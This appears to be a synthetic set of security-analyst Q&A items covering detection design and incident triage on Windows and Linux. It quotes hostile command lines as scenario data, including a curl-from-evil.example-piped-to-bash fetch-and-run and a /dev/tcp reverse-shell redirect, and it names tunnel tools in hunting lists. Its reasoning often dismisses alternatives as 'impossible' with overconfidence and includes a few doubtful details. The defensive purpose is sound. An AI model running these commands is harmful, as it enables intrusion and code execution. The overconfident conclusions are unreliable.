Our SIEM shows Sysmon EID 1 and EID 11 events for sc.exe creating a new service NetUpdate with binPath pointing to C:\Windows\System32\update.dll on a Tier-0 DC at 03:17 UTC. The EDR also captured the subsequent file write of a 180KB unsigned DLL. However, the Security log (both local and forwarded) contains no EID 4697, 4688, 4624, or 7045 events for the 03:00-03:30 window at all. The GPO requires Security auditing for service creation. Using Sherlock Holmes method, note every present signal and every critical absence, form hypotheses, eliminate the impossible, identify the most likely activity, and recommend the first 15-minute actions.

<reasoning>The kernel-level Sysmon driver recorded both the sc.exe process creation and the DLL write, proving the actions occurred. The complete absence of the corresponding Security auditing events (which are generated by lsasrv in user mode before any forwarding) on both the local DC Security log and the SIEM rules out network/collector issues. A real sc.exe service creation by an admin would always produce EID 4697 (service install) and 4688 regardless of GPO details or forwarding. The only way to have Sysmon events but zero Security events for the exact same actions is if the attacker cleared or disabled the Security channel (T1070.001) immediately after the service creation succeeded. The target path in System32, the service name chosen to look like an update mechanism, and the unsigned DLL all point to T1543.003 Windows Service persistence with anti-forensics applied to the primary Windows auditing channel.</reasoning>
<answer>{"hypotheses":["H1: Legitimate admin installed a service update but Security events failed to forward due to transient collector problem","H2: Sysmon produced spurious events while no real service was created","H3: Attacker with admin privileges created malicious Windows service (T1543.003) and immediately cleared the Security event log (T1070.001) to remove 4697/4688 artifacts while Sysmon protected driver channel still captured everything"],"impossible_ones":["H1 is impossible: even with forwarding failure the local Security log on the DC would contain the 4697 and 4688 events; GPO audit policy does not selectively suppress only those IDs for a genuine sc.exe call.","H2 is impossible: EDR verified the file hash and process tree of the sc.exe invocation and the written DLL."],"most_likely":"H3 - Attacker performed Windows Service persistence (T1543.003) by dropping an unsigned DLL into System32 and registering it as NetUpdate, then cleared the Security log (T1070.001) to hide the standard auditing trail.","confidence":"high","evidence_gaps":["Exact parent process and full command line of sc.exe","Whether any 1102 (log cleared) events exist in Application or System logs","Other hosts with NetUpdate service or update.dll in System32"],"recommended_next_steps":["EDR network-isolate the DC and suspend the new service process immediately","Capture full memory and forensic image of the DC before any remediation","Hunt enterprise-wide for the DLL hash and the service name NetUpdate","Review all other log channels (Sysmon, PowerShell Operational, System) on the DC and neighboring DCs for the preceding attack chain","Check backup copies or SIEM raw storage for any Security events that may have been forwarded before the clear"]}</answer>

EDR captured a powershell.exe process on a finance workstation at 01:47 UTC executing a 4KB base64 -enc one-liner that decoded to a downloader reaching 192.0.2.77:8443. Our DNS resolver logs (DC) show no queries for any name resolving to 192.0.2.77 in the prior 48 hours, and the explicit corporate proxy has no record of any connection from the workstation IP to that address or port. The workstation has normal internet access only through the proxy. Apply Sherlock Holmes method of observing all present details and every absent signal that a real outbound connection would have produced: what hypotheses fit, which are eliminated, what is the most likely explanation, and what should we hunt for?

<reasoning>The EDR provides high-confidence execution evidence including the exact decoded command and the network attempt. A genuine outbound connection to an external IP from a corporate host must traverse the corporate DNS resolver (or hosts file) and the explicit proxy. The total absence of both DNS queries and proxy CONNECT/HTTP records for the exact IP and time, despite the EDR seeing the process execute the downloader, eliminates any hypothesis that the connection used the normal corporate egress path. The only remaining coherent explanation is that the PowerShell code established a covert channel (direct socket, SOCKS tunnel via existing SSH session, or custom proxy logic that ignored system settings) that deliberately bypassed the monitored DNS and proxy layers. The odd hour, the length of the encoded command, and the use of a test-net IP further indicate malicious C2 rather than any internal tool.</reasoning>
<answer>{"hypotheses":["H1: The downloader ran but the connection failed (DNS or proxy block) and the attacker did not receive the callback","H2: Legitimate internal software used a hardcoded external IP for management that bypasses corporate proxy by design","H3: Attacker achieved execution via encoded PowerShell (T1059.001) and used a covert C2 channel or local proxy (T1090.001 / T1071.001) that avoided the corporate DNS resolver and explicit proxy entirely"],"impossible_ones":["H1 is impossible: the EDR saw the decoded command execute the network call; a silent failure would not have triggered the EDR behavioral detection on the downloader logic.","H2 is impossible: no legitimate finance tooling hard-codes 192.0.2.77 or uses 4KB base64 PowerShell downloaders."],"most_likely":"H3 - Attacker used encoded PowerShell (T1059.001) to establish a covert C2 channel (T1090) that bypassed monitored DNS and proxy infrastructure, explaining the complete absence of those telemetry sources for the observed destination.","confidence":"high","evidence_gaps":["Full decoded PowerShell script and any proxy or socket code it contained","EDR socket or network connection events from the exact powershell.exe process","Whether the IP appears in firewall, NetFlow, or endpoint connection tables on the host or adjacent systems"],"recommended_next_steps":["Hunt all EDR telemetry for other long base64 PowerShell executions or connections to 192.0.2.77 in the last 72h","Use live response on the workstation to inspect the PowerShell process command history, loaded modules, and open sockets","Inspect the workstation hosts file, DNS cache, and any running tunnel processes (ssh, plink, chisel, etc.)","Review proxy and DNS logs for any other hosts using similar encoded PowerShell or connecting to the same infrastructure on alternate ports","Escalate for memory capture and full script block reconstruction of the PowerShell session"]}</answer>

We want to strengthen detection of Linux process injection and memory-only payloads on production servers. Current coverage is basic auditd execve and some eBPF exec events. What additional specific telemetry sources or configuration (auditd watches, eBPF tracepoints, journald, /proc parsing) would give us reliable signals for techniques such as process hollowing, LD_PRELOAD injection, or ptrace-based injection, and why do they catch what simple execve misses?

<reasoning>Simple execve logging only sees the initial process launch; once an attacker has a foothold they can use ptrace, LD_PRELOAD, or /proc/<pid>/mem writes to inject into already-running processes without ever exec ing a new binary on disk. The critical missing signals are therefore memory writes to executable regions of other processes, unexpected library loads into existing processes, and the syscalls that enable them (ptrace, process_vm_writev, mmap with executable permissions on foreign memory). eBPF tracepoints on those syscalls plus auditd watches on /proc/<pid>/mem and /etc/ld.so.preload, combined with library load events from the dynamic linker, give visibility into the injection step itself rather than just the initial dropper execution.</reasoning>
<answer>{"scenario":"Detecting Linux process injection, hollowing, and LD_PRELOAD abuse on servers where only basic execve logging is present","recommended_data_sources":["eBPF tracepoints on ptrace, process_vm_writev, and mmap(PROT_EXEC) syscalls with process correlation","auditd watches on /proc/*/mem, /etc/ld.so.preload, and /etc/ld.so.conf.d/* with key for injection activity","eBPF uprobes or USDT on ld-linux / dlopen for unexpected library loads into long-lived processes","journald + auditd correlation for any process that changes its own /proc/self/exe or performs memfd_create + exec","File integrity monitoring on /etc/ld.so.preload and common library paths","EDR or Falco rules for processes opening /proc/<pid>/mem of unrelated PIDs with write permissions"],"rationale":"Injection techniques deliberately avoid new execve events on disk; they operate on already-running processes via memory or dynamic linker manipulation. Capturing the low-level syscalls and library load decisions surfaces the injection even when no new binary is written or executed.","sample_detection_logic":"Alert when an eBPF event shows process_vm_writev or ptrace(POKETEXT) from a non-debugger process into a target with different UID or outside expected parent-child relationship, or when /etc/ld.so.preload is modified followed by a new library load into a production service process.","potential_fps":"Legitimate debuggers (gdb, strace), certain Java/mono runtimes, and package managers that legitimately update ld.so.preload may trigger; baseline expected debug and library management processes per host role and exclude them by UID or binary path.","mitre_techniques":["T1055","T1574.006","T1620"]}</answer>

Our current detection for reverse shells on Linux web servers is a simple bash -i or nc -e in auditd execve logs. It produces too many false positives from legitimate admin sessions and misses modern variants that use /dev/tcp, python pty, or socat. Design a higher-fidelity behavioral detection using the available telemetry (auditd execve + execveat, journald session logs, eBPF network + process events). Give detection title, core logic, primary data sources, MITRE mapping, tuning notes, and priority.

<reasoning>A string match on bash -i or nc catches obvious one-liners but misses the vast majority of real reverse shells that use file descriptor redirection (/dev/tcp/ attacker/4444 0>&1), python -c with pty.spawn, or socat with no obvious keywords. The real signal is the combination of an interactive shell (or pty allocation) spawned by a web server worker (apache, nginx, php-fpm) that then immediately opens a network socket to a non-RFC1918 address, with no corresponding PAM or sshd authentication record in journald for that session. Using auditd for the exec and eBPF for the subsequent socket creation gives us the parentage and the network behavior even when the command line itself is obfuscated.</reasoning>
<answer>{"detection_title":"Reverse Shell from Web Server Worker Process via File Descriptor Redirection or Pty (T1059.004 / T1071)","core_logic":"A web server worker process (apache2, nginx, php-fpm, httpd) spawns an interactive shell or python/ruby/lua interpreter, the child immediately opens a TCP socket to a public IP on a high port with no corresponding successful PAM/journald login for the UID, and the process tree has no sshd or cron parent.","primary_data_sources":["auditd execve and execveat events with full command line and parent PID","eBPF or Sysmon-equivalent network connection events (socket creation from the shell PID)","journald AUTH and USER session logs for PAM logins on the same host and UID","EDR process tree and parent image for the shell process"],"mitre_techniques":["T1059.004","T1071.001","T1505.003"],"tuning_notes":"Exclude known management UIDs and hosts that run legitimate remote shells (jump hosts, bastions). Require the network destination to be non-RFC1918 or on ports commonly used for C2 (4444, 8443, 9001 etc.). Start with a 30-day baseline of web server worker PIDs and their normal children; alert only on first-seen shell + outbound socket combinations. Add reputation or geo for the destination IP when available.","priority":"high"}</answer>

We have a live EDR alert on a Windows server: a process named update.exe (renamed 7z) writing files with .locked extension and dropping a ransom note in multiple shares. The host is still encrypting. Memory capture is not yet available. The Security log shows a 4624 logon for a service account 18 minutes earlier, but no 4688 for the update.exe process itself and no 7045 or scheduled task creation in the preceding hour. Sysmon captured the process creation and file writes. The Security log forwarding is confirmed working for other hosts. What is the most likely attacker activity, which hypotheses are eliminated by the missing Security events, and what immediate volatile evidence collection and containment steps are required before we lose the running encryptor state?

<reasoning>The Sysmon events prove the renamed 7z encryptor is actively running and writing ransom artifacts. The complete absence of the corresponding Security EID 4688 for that exact process creation (while other 4624 events from the same period forwarded successfully) indicates the attacker disabled or cleared the Security channel after gaining the initial foothold but before launching the final encryptor. The 18-minute-old service account logon is the likely entry vector for the Cobalt Strike or similar beacon that then performed the T1486 encryption. The lack of 7045 or scheduled task events rules out simple scheduled-task persistence for the encryptor itself. The only remaining explanation is active ransomware encryption (T1486) with prior anti-forensics on the primary Windows auditing channel (T1070.001). We must prioritize volatile collection while the encryptor is still in memory.</reasoning>
<answer>{"initial_observation":"Live EDR alert on server showing renamed 7z binary writing .locked files and ransom notes across shares; Sysmon captured process creation and writes but Security log has no 4688 for the encryptor process and no 7045/scheduled task events despite confirmed forwarding","most_likely_attacker_activity":"Active ransomware encryption (T1486) via LOLBin (T1059.003) after initial access and log clearing (T1070.001) by prior Cobalt Strike or similar beacon","eliminated_alternatives":"Legitimate backup or compression job would not use a randomly renamed binary, write distinctive .locked extensions, or drop ransom notes; simple forwarding failure is ruled out because other Security events from the same host and time arrived successfully.","immediate_actions":["EDR host-isolate the server immediately (cut SMB and other outbound while keeping the process alive)","Capture full volatile memory dump and EDR process tree + open handles before any power-off or reimage","Snapshot the shares and any ransom note files for variant identification","Review all other log channels (Sysmon, PowerShell, Application) on the server and neighboring hosts for the beacon and pre-encryption activity"],"follow_on_hunting":["Enterprise hunt for the exact renamed 7z hash, .locked extension pattern, and any similar service account 4624 followed by missing 4688 patterns","Check for other hosts with the same service account logon in the last 48h and validate their Security logs are intact","Look for Cobalt Strike indicators (named pipes, process injection patterns, known mutexes) across the environment"],"containment_options":["Keep the host isolated but powered on for memory forensics and key recovery attempts","Block the service account credentials domain-wide and reset them after evidence collection","Temporarily disable SMB on other high-value servers in the same VLAN while hunting completes"]}</answer>

On a production Linux database server, auditd captured an execve of /usr/bin/sudo with command line sudo -u postgres psql from an sshd session at 04:22, followed by a successful USER_CMD for ALTER ROLE statements. However, there is no corresponding PAM session open record in journald for the postgres UID, no new login session in lastlog or utmp, and the sshd parent process shows the original user (not postgres) still attached. The postgres account has no password and is not in the sudoers file for that user. Using Sherlock Holmes method on the log absences and contradictions, what is the most likely explanation and recommended response?

<reasoning>The auditd execve and USER_CMD prove that sudo was invoked and postgres commands were run with elevated privileges. The complete absence of a PAM session record in journald for the target UID, the lack of utmp/lastlog update, and the parent sshd session still belonging to the original low-priv user indicate that no real login or su session occurred. Normal sudo to a different user would create a new PAM session and update the utmp database. The only mechanism that produces exactly this pattern is an attacker who used a kernel exploit or LD_PRELOAD to bypass the sudoers check and PAM entirely (T1548.003 or T1068), or more likely abused a SUID binary or capability to directly exec as postgres without going through the audited sudo path. The sudo command line is a red herring left by the attacker to mimic normal admin behavior.</reasoning>
<answer>{"hypotheses":["H1: The DBA legitimately used sudo -u postgres for maintenance and the journald PAM records were lost due to log rotation","H2: The postgres account was added to sudoers without documentation and the session simply did not log to utmp","H3: Attacker achieved local privilege escalation (T1068 or T1548.003) via kernel vuln or SUID abuse, then used a fake sudo command line while directly executing as postgres, bypassing PAM and utmp logging entirely"],"impossible_ones":["H1 is impossible: journald PAM records for the target UID would still exist even if rotated; lastlog and utmp would show the session switch.","H2 is impossible: the postgres account is not in sudoers and has no password, so a normal sudo would have failed with a PAM error that auditd would have logged."],"most_likely":"H3 - Attacker performed local privilege escalation to postgres (T1068) on the database server and mimicked a sudo command to hide the vector while running SQL as the service account.","confidence":"high","evidence_gaps":["The exact binary that performed the setuid (check /proc/PID/exe and capabilities)","Any recent kernel module loads or SUID binary changes on the host","Whether the ALTER ROLE commands were malicious (e.g. superuser grant or password change)"],"recommended_next_steps":["Immediately EDR-contain the database server and snapshot the postgres process","Capture full auditd rules and recent logs plus /proc for the offending PID","Hunt for other SUID binaries or capability sets on all Linux production hosts","Review the exact SQL statements executed by the postgres process for data exfil or backdoor accounts","Check for similar sudo + missing PAM patterns on other database and app servers"]}</answer>

Our EDR and Sysmon captured a PowerShell process (PID 2914) on a jump host executing a long encoded command at 02:11 that decoded to a reverse HTTPS C2. The Microsoft-Windows-PowerShell/Operational log (EID 4104 script block) is completely empty for that PID and time, even though script block logging is GPO-enabled and other PowerShell activity from the same host appears normally. The host ETW Microsoft-Windows-PowerShell provider subscription is confirmed active. What does the absence of the expected ETW events tell us about the attacker tradecraft and how should we weight this evidence?

<reasoning>The EDR and Sysmon have the process creation and the decoded C2 behavior, which is strong. The total absence of EID 4104 script block events for a process that executed a long encoded command, while other PowerShell on the same host is logged normally, indicates the attacker deliberately disabled or bypassed the PowerShell ETW provider (T1562.002 or T1059.001 with AMSI/ETW bypass). Normal encoded commands always generate 4104 events when the GPO is applied. The fact that the provider subscription is still active suggests a per-process or in-memory bypass (common with Cobalt Strike or custom loaders that patch the ETW registration or use unlogged execution contexts). This is a high-confidence indicator of sophisticated tradecraft rather than a logging failure.</reasoning>
<answer>{"source_type":"EDR process execution + Sysmon EID 1 + GPO-enforced PowerShell script block logging (EID 4104) on jump host","observed_claims":"Long base64 PowerShell executed reverse HTTPS C2; no corresponding 4104 script block events in Microsoft-Windows-PowerShell/Operational for that PID despite GPO and active ETW provider","credibility_factors":["Positive: EDR independently decoded and alerted on the C2 logic; other PowerShell 4104 events from the host arrived normally","Negative: Complete absence of 4104 for a long encoded command is technically impossible under normal GPO + ETW configuration unless the provider was bypassed in-memory for that process"],"overall_rating":"High - the missing ETW events are diagnostic of deliberate ETW/AMS I bypass (T1562.002) by a sophisticated actor using the PowerShell process for C2 (T1059.001 / T1071.001).","recommended_usage":"Treat as confirmed malicious C2 execution. Immediately review EDR for the full process tree, any injected threads, and parent of the PowerShell process. Hunt for other hosts with PowerShell processes that have network connections but zero 4104 events in the same time window. Assume the attacker has ETW bypass capability and prioritize memory forensics and behavioral (non-ETW) detections."}</answer>

We are seeing an increase in scheduled task persistence (T1053.005) that blends with normal software updaters. Our current Sysmon and Security log coverage catches some but misses many. What additional ETW providers, Sysmon config, or other telemetry would give the best visibility into task creation, modification, and the actions they trigger, especially when the task is registered via schtasks.exe or COM from a low-priv context?

<reasoning>Standard Security EID 4698/4700/4701 catch some scheduled task activity but only when the registering process has the necessary privileges and the events are not suppressed. Many modern persistence techniques register tasks via the Task Scheduler COM interface from low-priv processes or use schtasks.exe with /create from a compromised user context. The Microsoft-Windows-TaskScheduler/Operational ETW provider (EID 106, 200, 201) plus the Microsoft-Windows-TaskScheduler ETW provider give the actual task XML, the author, the trigger, and the exact action (command line or COM handler) at registration time. Combined with Sysmon registry monitoring on the Tasks key and process creation of schtasks.exe or taskeng.exe, this closes the gap on stealthy task persistence that bypasses the coarse Security log events.</reasoning>
<answer>{"scenario":"Detecting stealthy scheduled task persistence (T1053.005) registered via schtasks, COM, or low-priv contexts that evade standard Security 4698 events","recommended_data_sources":["Microsoft-Windows-TaskScheduler/Operational log (EID 106 task registered, 200/201 action start)","Microsoft-Windows-TaskScheduler ETW provider for raw task XML and registration details","Sysmon EID 1 for schtasks.exe and taskeng.exe with full command line and parent","Sysmon registry events on HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree and Tasks","EDR process access or file events on %SystemRoot%\\System32\\Tasks","PowerShell Operational log for ScheduledTasks module usage"],"rationale":"The TaskScheduler ETW channel records the actual task definition and registration even when the Security log does not fire or the registering process is low-priv. Registry watches catch direct tampering with the task store. This combination surfaces both the creation and the subsequent execution of the task action.","sample_detection_logic":"Alert on Microsoft-Windows-TaskScheduler EID 106 where the task action command line contains suspicious paths (%TEMP%, %APPDATA%, C:\\Users\\Public) or the author is not a known admin account, correlated with any schtasks.exe process creation from non-admin parents.","potential_fps":"Legitimate software installers and enterprise management tools (SCCM, Intune) create scheduled tasks; baseline known task authors and action paths per environment and exclude them.","mitre_techniques":["T1053.005","T1053.002"]}</answer>

We have passive DNS and EDR process creation logs but no good correlation rule for initial access brokers that use short-lived domains for C2. Design a detection that correlates a new or low-reputation domain queried by a workstation with subsequent process execution (especially Office, browser, or scripting hosts) and any outbound connection from that process within 60 seconds. Provide title, core logic, data sources, MITRE, tuning, priority.

<reasoning>A standalone DNS alert on a new domain is too noisy. The high-value signal is the tight temporal correlation between the DNS query for a never-before-seen domain and the immediate execution of a process that can interpret the response (browser, Office with macro, PowerShell, or curl/wget) followed by an outbound socket from that exact process. This pattern is classic for IAB payload delivery via malicious document or drive-by. Using EDR process creation with full parentage plus DNS logs (or EDR DNS events if available) and network connection events lets us build a high-fidelity rule that requires the process lineage and timing to be suspicious, not just the domain itself.</reasoning>
<answer>{"detection_title":"New/Low-Reputation Domain Query Immediately Followed by Suspicious Process Execution and Outbound Connection (T1566.001 / T1105)","core_logic":"A workstation performs a DNS query for a domain with age < 7 days or low reputation, within 60 seconds a process whose parent is Office, browser, or explorer executes, and that process opens a TCP connection to a public IP on a non-standard port; the domain or the resolved IP has no prior history on the host.","primary_data_sources":["EDR or Sysmon EID 1 process creation with ParentImage and CommandLine","EDR or network DNS query events (or SIEM DNS logs)","EDR/Sysmon EID 3 network connection events from the same process PID","Passive DNS or threat intel reputation for the queried domain","Proxy or firewall logs for the subsequent connection if EDR network is limited"],"mitre_techniques":["T1566.001","T1105","T1071.001"],"tuning_notes":"Require the process parent to be one of the common delivery vectors (winword.exe, excel.exe, msedge.exe, chrome.exe, powershell.exe). Exclude known good software update domains and CDNs. Use a 30-day per-host baseline for first seen domain queries. Start with high confidence and add a minimum age or reputation score threshold. Tune the 60-second window after observing real incidents; 30-120s is typical for IAB droppers.","priority":"high"}</answer>

A production Linux app server shows in journald a successful SSH login for user deploy at 03:41 from an internal jump host, followed by exec of systemctl restart app and curl -s https://evil.example/p | bash. The auditd logs for the same PID show the curl and bash execve but the UID is 0 (root) and there is no PAM or sshd session record for root. The deploy user has no sudo rights and the jump host session log shows the operator logged out 40 minutes earlier. The container runtime on the host shows no new containers. What is the most likely attacker activity, what does the contradiction between journald and auditd tell us, and what immediate actions follow?

<reasoning>The journald SSH login for deploy followed by curl | bash looks like a legitimate deploy user session, but the auditd events for the same commands show UID 0 with no corresponding PAM session or sshd record for root. This contradiction is only possible if the attacker first compromised the deploy account (or the jump host), then used a kernel exploit, capability, or SUID binary to escalate to root (T1068), and the journald/SSH layer did not see the privilege change while the kernel-level auditd did. The fact that the operator had already logged out 40 minutes earlier and the jump host session is closed eliminates a legitimate late-night deploy. The curl to evil domain from root context is the payload execution (T1105 + T1059.004). The most likely activity is post-exploitation privilege escalation to root on the app server followed by download and execution of a root-level implant or reverse shell.</reasoning>
<answer>{"initial_observation":"journald shows deploy SSH login + systemctl + curl | bash at 03:41; auditd for same commands shows UID 0 with no PAM/sshd record for root; deploy has no sudo; operator logged out 40 min earlier on jump host","most_likely_attacker_activity":"Privilege escalation to root on Linux app server (T1068) after initial access via compromised deploy/jump host credentials, followed by payload download and execution (T1105 + T1059.004)","eliminated_alternatives":"Legitimate deploy session would have consistent UID across journald and auditd and would have left a PAM record for the target UID; the 40-minute gap after operator logout and the evil domain make benign activity impossible.","immediate_actions":["EDR-contain the app server and suspend all processes from the suspicious PID tree","Capture full memory, auditd logs, and journald for the host before any restart","Collect the exact payload downloaded by the curl | bash and any dropped files in /tmp or /var/tmp","Review all recent SSH and sudo activity on the jump host and other servers the deploy account can reach"],"follow_on_hunting":["Hunt for other hosts with UID 0 execve events that lack corresponding PAM/journald session records","Look for similar curl | bash or /dev/tcp patterns from service accounts on all Linux production systems","Validate that the deploy account and jump host have not been used for any other post-logout activity"],"containment_options":["Isolate the app server at the network level while preserving the running state for forensics","Reset credentials for deploy and any accounts that had access to the jump host","Temporarily disable password and key auth for the deploy user until full investigation completes"]}</answer>
